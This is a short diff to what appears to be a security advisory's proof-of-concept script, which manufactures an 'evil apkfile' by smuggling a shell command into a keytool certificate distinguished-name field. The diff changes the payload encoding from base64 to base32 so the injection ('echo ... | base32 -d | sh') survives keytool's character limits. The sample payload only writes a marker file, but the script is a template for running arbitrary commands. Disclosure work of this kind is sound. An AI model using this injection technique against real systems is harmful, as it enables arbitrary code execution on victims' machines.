@@ -123,14 +123,16 @@ given command-line payload when used as a template.
 import subprocess
 import tempfile
 import os
-from base64 import b64encode
+from base64 import b32encode
 
 # Change me
 payload = 'echo "Code execution as $(id)" > /tmp/win'
 
-# b64encode to avoid badchars (keytool is picky)
-payload_b64 = b64encode(payload.encode()).decode()
-dname = f"CN='|echo {payload_b64} | base64 -d | sh #"
+# b32encode to avoid badchars (keytool is picky)
+# thanks to @fdellwing for noticing that base64 can sometimes break keytool
+# <https://github.com/justinsteven/advisories/issues/2>
+payload_b32 = b32encode(payload.encode()).decode()
+dname = f"CN='|echo {payload_b32} | base32 -d | sh #"
 
 print(f"[+] Manufacturing evil apkfile")
 print(f"Payload: {payload}")
